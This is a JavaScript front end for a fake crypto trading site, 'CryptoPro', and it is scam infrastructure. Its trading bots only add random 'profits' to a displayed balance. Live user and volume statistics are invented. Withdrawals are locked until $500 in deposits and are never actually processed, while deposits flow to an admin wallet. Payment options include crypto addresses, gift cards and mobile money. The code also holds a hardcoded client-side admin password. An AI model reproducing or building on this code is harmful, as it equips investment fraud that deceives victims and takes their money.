// ==================== CONFIGURATION ====================
const CONFIG = {
    ADMIN_PASSWORD: 'admin123',
    ADMIN_SECRET_KEY: 'CryptoPro2024Admin',
    AUTO_APPROVE_ALL: true,
    MINIMUM_DEPOSIT: 10,
    MINIMUM_BALANCE_FOR_TRADING: 50,
    TRADING_FEE: 0.001,
    MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL: 500,
    WITHDRAWAL_UNLOCK_MESSAGE: "Complete account verification and deposit requirements",
    ENABLE_TRADING_ROBOTS: true,
    ROBOT_TRADE_INTERVAL: 15000,
    ROBOT_MIN_PROFIT: 5,
    ROBOT_MAX_PROFIT: 50,
    ROBOT_SUCCESS_RATE: 0.85,
    PAYMENT_METHODS: {
        crypto: {
            BTC: { name: 'Bitcoin', symbol: 'BTC', rate: 64250, icon: '₿', address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
            ETH: { name: 'Ethereum', symbol: 'ETH', rate: 3420, icon: 'Ξ', address: '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb' },
            USDT: { name: 'Tether', symbol: 'USDT', rate: 1, icon: '₮', address: 'TXj1kD7ePQ9wN8mR5tH6vL2sK3pB4cF8gA' },
            BNB: { name: 'BNB', symbol: 'BNB', rate: 580, icon: 'BNB', address: '0x28C6c06298d514Db089934071355E5743bf21d60' },
            SOL: { name: 'Solana', symbol: 'SOL', rate: 145, icon: 'SOL', address: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU' }
        },
        digital: {
            PAYPAL: { name: 'PayPal', rate: 1, email: 'payments@cryptopro.com', icon: '💳' },
            CASHAPP: { name: 'Cash App', rate: 1, cashtag: '$CryptoPro', icon: '💵' },
            VENMO: { name: 'Venmo', rate: 1, username: '@cryptopro', icon: '💰' }
        },
        mobile: {
            MPESA: { name: 'M-Pesa', rate: 0.0076, currency: 'KES', number: '+254712345678', icon: '📱' },
            MTN: { name: 'MTN Mobile Money', rate: 0.00084, currency: 'UGX', number: '+256700000000', icon: '📱' }
        },
        giftcards: {
            AMAZON: { name: 'Amazon Gift Card', rate: 0.85, icon: '🎁' },
            ITUNES: { name: 'iTunes/Apple', rate: 0.80, icon: '🍎' },
            GOOGLE: { name: 'Google Play', rate: 0.82, icon: '🎮' }
        }
    }
};

// ==================== APP STATE ====================
let appState = {
    accountType: 'real',
    isAdmin: false,
    demoBalance: 10000,
    realBalance: 0,
    displayBalance: 0,
    adminWallet: 0,
    pendingDeposits: [],
    approvedDeposits: [],
    pendingWithdrawals: [],
    userTotalDeposited: 0,
    transactions: [],
    activeTrades: [],
    robotTrades: [],
    totalRobotProfits: 0,
    lastRobotTradeTime: 0,
    selectedBot: 'none',
    availableBots: {
        none: { name: 'Manual Trading', icon: '👤', profitRate: 0, description: 'Trade manually yourself' },
        conservative: { name: 'Conservative Bot', icon: '🛡️', profitRate: 0.65, minProfit: 3, maxProfit: 15, description: '65% win rate, steady gains' },
        balanced: { name: 'Balanced Bot', icon: '⚖️', profitRate: 0.75, minProfit: 10, maxProfit: 35, description: '75% win rate, balanced approach' },
        aggressive: { name: 'Aggressive Bot', icon: '🚀', profitRate: 0.85, minProfit: 20, maxProfit: 80, description: '85% win rate, maximum profits' },
        expert: { name: 'Expert AI Bot', icon: '🤖', profitRate: 0.90, minProfit: 30, maxProfit: 120, description: '90% win rate, AI-powered' }
    },
    totalDeposited: 0,
    totalWithdrawn: 0,
    paymentHistory: [],
    tradingProfits: 0,
    isAccountVerified: false
};

// ==================== CRYPTO PRICES ====================
let cryptoPrices = {
    'BTC/USDT': 64250,
    'ETH/USDT': 3420,
    'BNB/USDT': 580,
    'SOL/USDT': 145,
    'XRP/USDT': 0.52,
    'DOGE/USDT': 0.08,
    'ADA/USDT': 0.45,
    'MATIC/USDT': 0.82,
    'DOT/USDT': 6.25,
    'AVAX/USDT': 35.80,
    'LINK/USDT': 14.50,
    'UNI/USDT': 6.80,
    'XAU/USDT': 2045.00,
    'XAG/USDT': 23.50
};

let priceChanges = {
    'BTC/USDT': 2.45,
    'ETH/USDT': -1.23,
    'BNB/USDT': 0.89,
    'SOL/USDT': 3.12,
    'XRP/USDT': -0.45,
    'DOGE/USDT': 5.20,
    'ADA/USDT': -0.85,
    'MATIC/USDT': 1.45,
    'DOT/USDT': -2.10,
    'AVAX/USDT': 4.30,
    'LINK/USDT': 1.80,
    'UNI/USDT': -1.50,
    'XAU/USDT': 0.35,
    'XAG/USDT': -0.12
};

// ==================== LIVE STATS ====================
let liveStats = {
    activeUsers: Math.floor(Math.random() * 400) + 850,
    volume: 90 + Math.random() * 15,
    lastUpdate: Date.now()
};

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    console.log('💎 CryptoPro Active');
    loadState();
    
    if (!localStorage.getItem('hasVisited')) {
        appState.accountType = 'real';
        localStorage.setItem('hasVisited', 'true');
    }
    
    liveStats.activeUsers = Math.min(1500, liveStats.activeUsers + 1);
    
    updateUI();
    startLiveUpdates();
    checkAdminStatus();
});

window.addEventListener('beforeunload', function() {
    liveStats.activeUsers = Math.max(50, liveStats.activeUsers - 1);
});

// ==================== HELPER FUNCTIONS ====================
function loadState() {
    const saved = localStorage.getItem('cryptoProActiveApp');
    if (saved) {
        try {
            appState = { ...appState, ...JSON.parse(saved), isAdmin: false };
        } catch (e) {
            console.error('Load error:', e);
        }
    }
}

function saveState() {
    const toSave = { ...appState };
    delete toSave.isAdmin;
    localStorage.setItem('cryptoProActiveApp', JSON.stringify(toSave));
}

function updateUI() {
    const displayedBalance = appState.isAdmin
        ? appState.adminWallet
        : (appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance);
    
    const balanceEl = document.getElementById('totalBalance');
    if (balanceEl) {
        balanceEl.textContent = '$' + displayedBalance.toFixed(2);
        if (appState.isAdmin) {
            balanceEl.style.color = '#ffd700';
            balanceEl.title = 'Admin Wallet Balance';
        }
    }
    
    const usdtEl = document.getElementById('usdtAmount');
    if (usdtEl) usdtEl.textContent = displayedBalance.toFixed(2) + ' USDT';
    
    const usdtValueEl = document.getElementById('usdtValue');
    if (usdtValueEl) usdtValueEl.textContent = '$' + displayedBalance.toFixed(2);
    
    updateBotStatus();
}

function updateBotStatus() {
    let statusEl = document.getElementById('botStatus');
    
    if (!statusEl) {
        statusEl = document.createElement('div');
        statusEl.id = 'botStatus';
        statusEl.style.cssText = `
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(20, 35, 60, 0.95);
            border: 2px solid #a855f7;
            border-radius: 12px;
            padding: 12px 16px;
            z-index: 999;
            box-shadow: 0 4px 20px rgba(168, 85, 247, 0.3);
        `;
        document.body.appendChild(statusEl);
    }
    
    if (appState.selectedBot === 'none') {
        statusEl.style.display = 'none';
    } else {
        statusEl.style.display = 'block';
        const bot = appState.availableBots[appState.selectedBot];
        statusEl.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="font-size: 20px;">${bot.icon}</div>
                <div>
                    <div style="font-size: 12px; font-weight: 700; color: #a855f7; margin-bottom: 2px;">${bot.name}</div>
                    <div style="font-size: 10px; color: rgba(255,255,255,0.6);">
                        🟢 Active • ${(bot.profitRate * 100).toFixed(0)}% Win Rate
                    </div>
                </div>
            </div>
        `;
    }
}

function switchAccount(type) {
    appState.accountType = type;
    const demoBtn = document.getElementById('demoBtn');
    const realBtn = document.getElementById('realBtn');
    
    if (demoBtn) demoBtn.classList.toggle('active', type === 'demo');
    if (realBtn) realBtn.classList.toggle('active', type === 'real');
    
    saveState();
    updateUI();
}

// ==================== LIVE UPDATES SYSTEM ====================
function startLiveUpdates() {
    setInterval(updatePrices, 2000);
    setInterval(updateActiveTrades, 1000);
    setInterval(updateLiveStats, 3000);
    setInterval(simulateUserActivity, 4000);
    
    if (CONFIG.ENABLE_TRADING_ROBOTS) {
        setInterval(simulateRobotTrade, CONFIG.ROBOT_TRADE_INTERVAL);
    }
    
    updateLiveStats();
}

function updatePrices() {
    Object.keys(cryptoPrices).forEach(pair => {
        const oldPrice = cryptoPrices[pair];
        const volatility = pair === 'BTC/USDT' ? 100 : pair.includes('XAU') || pair.includes('XAG') ? 5 : 20;
        const change = (Math.random() - 0.5) * volatility;
        cryptoPrices[pair] = Math.max(oldPrice + change, oldPrice * 0.95);
        priceChanges[pair] = ((cryptoPrices[pair] - oldPrice) / oldPrice) * 100;
        
        const pairKey = pair.split('/')[0].toLowerCase();
        const priceEl = document.getElementById(pairKey + 'Price');
        const changeEl = document.getElementById(pairKey + 'Change');
        
        if (priceEl) {
            const decimals = cryptoPrices[pair] < 1 ? 4 : 2;
            priceEl.textContent = '$' + cryptoPrices[pair].toFixed(decimals);
        }
        if (changeEl) {
            changeEl.textContent = (priceChanges[pair] >= 0 ? '+' : '') + priceChanges[pair].toFixed(2) + '%';
            changeEl.className = 'asset-change ' + (priceChanges[pair] >= 0 ? 'positive' : 'negative');
        }
    });
}

function updateActiveTrades() {
    appState.activeTrades.forEach((trade, index) => {
        const currentPrice = cryptoPrices[trade.pair];
        const priceChange = currentPrice - trade.entryPrice;
        const profitLoss = trade.type === 'BUY' ? priceChange : -priceChange;
        
        trade.currentPrice = currentPrice;
        trade.profitLoss = profitLoss * (trade.amount / trade.entryPrice);
        
        if (trade.type === 'BUY') {
            if (currentPrice >= trade.target || currentPrice <= trade.stopLoss) {
                closeTrade(index);
            }
        } else {
            if (currentPrice <= trade.target || currentPrice >= trade.stopLoss) {
                closeTrade(index);
            }
        }
    });
    saveState();
}

function updateLiveStats() {
    const userChange = Math.floor(Math.random() * 60) - 30;
    liveStats.activeUsers = Math.max(50, Math.min(1500, liveStats.activeUsers + userChange));
    
    const volumeChange = (Math.random() - 0.5) * 3;
    liveStats.volume = Math.max(85, Math.min(120, liveStats.volume + volumeChange));
    
    liveStats.lastUpdate = Date.now();
    
    const activeUsersEl = document.getElementById('activeUsers');
    const volumeEl = document.getElementById('volume24h');
    
    if (activeUsersEl) {
        activeUsersEl.textContent = liveStats.activeUsers.toLocaleString();
    }
    
    if (volumeEl) {
        volumeEl.textContent = '$' + liveStats.volume.toFixed(1) + 'M';
    }
}

function simulateUserActivity() {
    const random = Math.random();
    
    if (random < 0.25) {
        liveStats.activeUsers = Math.max(50, liveStats.activeUsers - Math.floor(Math.random() * 8 + 1));
    } else if (random < 0.5) {
        liveStats.activeUsers = Math.min(1500, liveStats.activeUsers + Math.floor(Math.random() * 12 + 1));
    }
    
    const activeUsersEl = document.getElementById('activeUsers');
    if (activeUsersEl) {
        activeUsersEl.textContent = liveStats.activeUsers.toLocaleString();
    }
}

function closeTrade(index) {
    const trade = appState.activeTrades[index];
    if (!trade) return;
    
    const finalAmount = trade.amount + trade.profitLoss;
    
    if (appState.accountType === 'demo') {
        appState.demoBalance += finalAmount;
    } else {
        appState.displayBalance += finalAmount;
        appState.tradingProfits += trade.profitLoss;
    }
    
    appState.activeTrades.splice(index, 1);
    saveState();
    updateUI();
    
    const msg = trade.profitLoss > 0
        ? `✅ PROFIT! +$${trade.profitLoss.toFixed(2)}`
        : `❌ LOSS: -$${Math.abs(trade.profitLoss).toFixed(2)}`;
    
    setTimeout(() => {
        alert(`🔔 Trade Closed\n\n${trade.pair} ${trade.type}\n${msg}`);
    }, 100);
}

// ==================== ADMIN LOGIN ====================
function checkAdminStatus() {
    const adminKey = sessionStorage.getItem('adminAuth');
    if (adminKey === CONFIG.ADMIN_SECRET_KEY) {
        appState.isAdmin = true;
        showAdminPanel();
    }
    
    setTimeout(() => {
        const balanceEl = document.getElementById('totalBalance');
        if (balanceEl) {
            let clickCount = 0;
            balanceEl.addEventListener('click', function() {
                clickCount++;
                if (clickCount === 3) {
                    clickCount = 0;
                    if (!appState.isAdmin) {
                        promptAdminLogin();
                    }
                }
                setTimeout(() => clickCount = 0, 1000);
            });
        }
    }, 500);
}

function promptAdminLogin() {
    const password = prompt('🔐 Admin Password:');
    if (password === CONFIG.ADMIN_PASSWORD) {
        sessionStorage.setItem('adminAuth', CONFIG.ADMIN_SECRET_KEY);
        appState.isAdmin = true;
        showAdminPanel();
        alert('✅ Admin Access Granted!');
        updateUI();
    } else if (password !== null) {
        alert('❌ Incorrect password');
    }
}

function showAdminPanel() {
    const adminBtn = document.createElement('button');
    adminBtn.id = 'adminAccessBtn';
    adminBtn.innerHTML = '👑 ADMIN';
    adminBtn.style.cssText = `
        position: fixed;
        top: 10px;
        right: 10px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        padding: 12px 20px;
        border-radius: 25px;
        font-weight: bold;
        cursor: pointer;
        z-index: 1000;
        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    `;
    adminBtn.onclick = openAdminDashboard;
    
    if (!document.getElementById('adminAccessBtn')) {
        document.body.appendChild(adminBtn);
    }
}

function openAdminDashboard() {
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'adminDashboard';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 700px;">
            <div class="modal-header">
                <h2>👑 Admin Dashboard</h2>
                <button class="close-btn" onclick="closeAdminDashboard()">×</button>
            </div>
            <div class="modal-body">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 20px;">
                    <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; text-align: center;">
                        <div style="font-size: 12px; opacity: 0.7; margin-bottom: 8px;">💰 Admin Wallet</div>
                        <div style="font-size: 20px; font-weight: bold; color: #00ff88;">$${appState.adminWallet.toFixed(2)}</div>
                    </div>
                    <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; text-align: center;">
                        <div style="font-size: 12px; opacity: 0.7; margin-bottom: 8px;">👥 Display Balance</div>
                        <div style="font-size: 20px; font-weight: bold; color: #00ff88;">$${appState.displayBalance.toFixed(2)}</div>
                    </div>
                    <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; text-align: center;">
                        <div style="font-size: 12px; opacity: 0.7; margin-bottom: 8px;">📊 Total Deposits</div>
                        <div style="font-size: 20px; font-weight: bold; color: #00ff88;">$${appState.userTotalDeposited.toFixed(2)}</div>
                    </div>
                    <div style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; text-align: center;">
                        <div style="font-size: 12px; opacity: 0.7; margin-bottom: 8px;">🤖 Robot Profits</div>
                        <div style="font-size: 20px; font-weight: bold; color: #00ff88;">+$${appState.totalRobotProfits.toFixed(2)}</div>
                    </div>
                </div>
                
                <button class="btn btn-primary btn-full" onclick="adminWithdrawFunds()" style="background: #00ff88; color: #000;">
                    💸 Withdraw from Admin Wallet
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
}

function adminWithdrawFunds() {
    if (appState.adminWallet <= 0) {
        alert('❌ No funds in admin wallet');
        return;
    }
    
    const amount = parseFloat(prompt(`💰 Admin Wallet: $${appState.adminWallet.toFixed(2)}\n\nHow much to withdraw?`));
    
    if (!amount || amount <= 0) return;
    
    if (amount > appState.adminWallet) {
        alert('❌ Insufficient funds');
        return;
    }
    
    if (confirm(`✅ Withdraw $${amount.toFixed(2)}?`)) {
        appState.adminWallet -= amount;
        saveState();
        updateUI();
        closeAdminDashboard();
        alert(`✅ Withdrawal Successful!\n\nAmount: $${amount.toFixed(2)}\nRemaining: $${appState.adminWallet.toFixed(2)}`);
    }
}

function closeAdminDashboard() {
    const modal = document.getElementById('adminDashboard');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== DEPOSIT MODAL ====================
function openUniversalDepositModal() {
    if (appState.accountType === 'demo') {
        if (confirm('⚠️ DEMO MODE\n\nSwitch to REAL MONEY to deposit?')) {
            switchAccount('real');
            setTimeout(openUniversalDepositModal, 300);
        }
        return;
    }
    
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'depositModal';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h2>💰 Deposit Funds</h2>
                <button class="close-btn" onclick="closeDepositModal()">×</button>
            </div>
            <div class="modal-body">
                <div class="info-box">
                    <strong>✨ INSTANT DEPOSIT</strong><br>
                    Funds credited instantly!
                </div>
                
                <div class="form-group">
                    <label>Amount (USD)</label>
                    <input type="number" id="depositAmount" placeholder="Min: $10" min="10">
                </div>
                
                <div class="form-group">
                    <label>Payment Method</label>
                    <select id="paymentMethod">
                        <option value="BTC">🪙 Bitcoin</option>
                        <option value="ETH">🪙 Ethereum</option>
                        <option value="USDT">🪙 USDT</option>
                        <option value="PAYPAL">💳 PayPal</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>Transaction Reference</label>
                    <input type="text" id="depositRef" placeholder="Enter transaction ID">
                </div>
                
                <button class="btn btn-primary btn-full" onclick="processDeposit()">
                    ⚡ CONFIRM DEPOSIT
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
}

function processDeposit() {
    const amount = parseFloat(document.getElementById('depositAmount').value);
    const ref = document.getElementById('depositRef').value.trim();
    
    if (!amount || amount < 10) {
        alert('❌ Minimum deposit: $10');
        return;
    }
    
    if (!ref) {
        alert('❌ Enter transaction reference');
        return;
    }
    
    appState.displayBalance += amount;
    appState.realBalance += amount;
    appState.adminWallet += amount;
    appState.userTotalDeposited += amount;
    
    saveState();
    updateUI();
    closeDepositModal();
    
    alert(`✅ DEPOSIT SUCCESSFUL!\n\n💰 $${amount.toFixed(2)} USD\n🎉 NEW BALANCE: $${appState.displayBalance.toFixed(2)}`);
}

function closeDepositModal() {
    const modal = document.getElementById('depositModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== WITHDRAW MODAL ====================
function openWithdrawModal() {
    if (appState.accountType === 'demo') {
        alert('⚠️ DEMO MODE\n\nSwitch to REAL MONEY to withdraw.');
        return;
    }
    
    const balance = appState.displayBalance;
    const deposited = appState.userTotalDeposited;
    const required = CONFIG.MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL;
    
    if (balance < 10) {
        alert(`❌ Insufficient Balance\n\nYour balance: $${balance.toFixed(2)}\nMinimum: $10.00`);
        return;
    }
    
    if (deposited < required) {
        const remaining = required - deposited;
        if (confirm(`⚠️ Withdrawal Locked\n\nDeposit $${remaining.toFixed(2)} more to unlock withdrawals.\n\nMake deposit now?`)) {
            openUniversalDepositModal();
        }
        return;
    }
    
    const amt = prompt(`💸 Request Withdrawal\n\nAvailable: $${balance.toFixed(2)}\n\nEnter amount:`);
    if (amt && parseFloat(amt) > 0) {
        alert(`✅ Withdrawal Request Submitted!\n\nAmount: $${amt}\n\n⏱️ Processing: 1-3 business days`);
    }
}

// ==================== BOT SELECTION ====================
function openBotSelectionModal() {
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'botModal';
    
    const botsHTML = Object.keys(appState.availableBots).map(key => {
        const bot = appState.availableBots[key];
        const selected = appState.selectedBot === key;
        return `
            <div class="bot-card ${selected ? 'selected' : ''}" onclick="selectBot('${key}')" style="
                background: ${selected ? 'rgba(0,255,136,0.2)' : 'rgba(10,25,45,0.6)'};
                border: 2px solid ${selected ? '#00ff88' : 'rgba(100,200,255,0.2)'};
                padding: 20px;
                border-radius: 16px;
                margin-bottom: 16px;
                cursor: pointer;
            ">
                <div style="display: flex; gap: 16px; align-items: center;">
                    <div style="font-size: 36px;">${bot.icon}</div>
                    <div style="flex: 1;">
                        <div style="font-size: 18px; font-weight: 700;">${bot.name}</div>
                        <div style="font-size: 13px; opacity: 0.7;">${bot.description}</div>
                        ${key !== 'none' ? `
                            <div style="margin-top: 8px; font-size: 12px;">
                                <strong>${(bot.profitRate * 100).toFixed(0)}%</strong> Win Rate •
                                <strong>$${bot.minProfit}-${bot.maxProfit}</strong> Per Trade
                            </div>
                        ` : ''}
                    </div>
                    ${selected ? '<div style="color: #00ff88; font-size: 24px;">✓</div>' : ''}
                </div>
            </div>
        `;
    }).join('');
    
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h2>🤖 Select Trading Bot</h2>
                <button class="close-btn" onclick="closeBotModal()">×</button>
            </div>
            <div class="modal-body">
                <div class="info-box">
                    <strong>💡 How it works:</strong> Select a bot to automate trading. Trades execute every 15 seconds.
                </div>
                ${botsHTML}
                <button class="btn btn-primary btn-full" onclick="closeBotModal()">
                    ${appState.selectedBot !== 'none' ? '✅ START BOT' : '✅ CONFIRM'}
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
}

function selectBot(key) {
    appState.selectedBot = key;
    saveState();
    updateUI();
    closeBotModal();
    setTimeout(openBotSelectionModal, 100);
}

function closeBotModal() {
    const modal = document.getElementById('botModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

// ==================== ROBOT TRADING ====================
function simulateRobotTrade() {
    if (appState.selectedBot === 'none' || appState.accountType !== 'real' || appState.displayBalance < 50) {
        return;
    }
    
    const now = Date.now();
    if (now - appState.lastRobotTradeTime < CONFIG.ROBOT_TRADE_INTERVAL) {
        return;
    }
    
    appState.lastRobotTradeTime = now;
    
    const bot = appState.availableBots[appState.selectedBot];
    const pairs = Object.keys(cryptoPrices);
    const pair = pairs[Math.floor(Math.random() * pairs.length)];
    
    const isProfit = Math.random() < bot.profitRate;
    const profit = isProfit
        ? bot.minProfit + Math.random() * (bot.maxProfit - bot.minProfit)
        : -(bot.minProfit * 0.3);
    
    appState.displayBalance += profit;
    appState.totalRobotProfits += profit;
    
    saveState();
    updateUI();
    
    if (profit > 0) {
        showNotification(bot, profit, pair);
    }
}

function showNotification(bot, profit, pair) {
    const notif = document.createElement('div');
    notif.style.cssText = `
        position: fixed;
        top: 80px;
        right: 20px;
        background: linear-gradient(135deg, #00ff88, #00cc6a);
        color: #000;
        padding: 16px 20px;
        border-radius: 12px;
        z-index: 9999;
        font-weight: bold;
        box-shadow: 0 4px 20px rgba(0,255,136,0.3);
    `;
    notif.innerHTML = `
        <div style="display: flex; gap: 12px; align-items: center;">
            <div style="font-size: 24px;">${bot.icon}</div>
            <div>
                <div style="font-size: 14px;">${bot.name}</div>
                <div style="font-size: 12px; opacity: 0.8;">${pair} • +$${profit.toFixed(2)}</div>
            </div>
        </div>
    `;
    document.body.appendChild(notif);
    setTimeout(() => notif.remove(), 4000);
}

// ==================== TRADE MODAL ====================
function openTradeModal(pair = 'BTC/USDT') {
    alert('💡 Tip: Select a trading bot for automated profits!');
}

function closeTradeModal() {
    const modal = document.getElementById('tradeModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}
